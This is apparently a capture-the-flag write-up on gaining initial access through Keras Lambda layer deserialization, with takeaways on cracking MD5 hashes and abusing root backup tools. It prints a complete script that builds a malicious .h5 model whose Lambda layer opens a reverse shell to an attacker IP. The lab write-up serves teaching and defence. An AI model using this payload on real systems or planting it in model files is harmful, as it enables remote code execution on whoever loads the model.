Phase 1

Initial Access — Keras Lambda Layer Deserialization RCE

Why loading untrusted ML models = RCE Keras Lambda layers embed arbitrary Python functions inside the model file. When load_model() deserializes the .h5 file, the Lambda function is reconstructed and can be called — executing whatever code it contains. This is a textbook insecure deserialization attack. The model file IS the payload.

Build the Malicious Model (Matching Target Environment)

# Use the provided Dockerfile to match the exact TensorFlow version
$ docker build -t artificial-exploit .
$ docker run -it --rm -v $(pwd):/code artificial-exploit

# Inside the container: generate exploit.h5
$ cat > exploit.py << 'EOF'
import tensorflow as tf
import os

# Malicious function — reverse shell embedded in Lambda layer
def evil_code(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.15/4444 0>&1'")
    return x

# Build model with the malicious Lambda layer
model = tf.keras.Sequential([
    tf.keras.layers.Input(shape=(1,)),
    tf.keras.layers.Lambda(evil_code)
])
model.compile(optimizer='adam', loss='mse')
model.save('exploit.h5')
print("[+] exploit.h5 generated")
EOF

python exploit.py
Version matching matters The .h5 format includes serialized Python objects tied to the TensorFlow version. If you generate the model with a different version than the target, load_model() may fail silently or crash. Always match the exact version — here, the provided Dockerfile makes this easy.

Appendix

Key Takeaways

Never load untrusted ML models.

Keras Lambda layers execute arbitrary Python during load_model(). A .h5 file is not just data — it's executable code. This applies to pickle, joblib, and most ML serialization formats.

Match the target's exact library version.

TensorFlow model files are version-sensitive. The provided Dockerfile was a gift — use it to build the exploit in the identical environment.

SQLite databases in app directories hold credentials.

users.db with unsalted MD5 hashes — instant crack with CrackStation or hashcat.

Backup tools running as root are privilege escalation goldmines.

Backrest, restic, BorgBackup — if they run as root and you control the backup configuration, you can read (and sometimes write) any file on the system.

Config files in backup archives leak credentials.

The Backrest bcrypt hash was inside a backup tarball at /var/backups/. Always check backup files — they often contain configs from a time when security was looser.
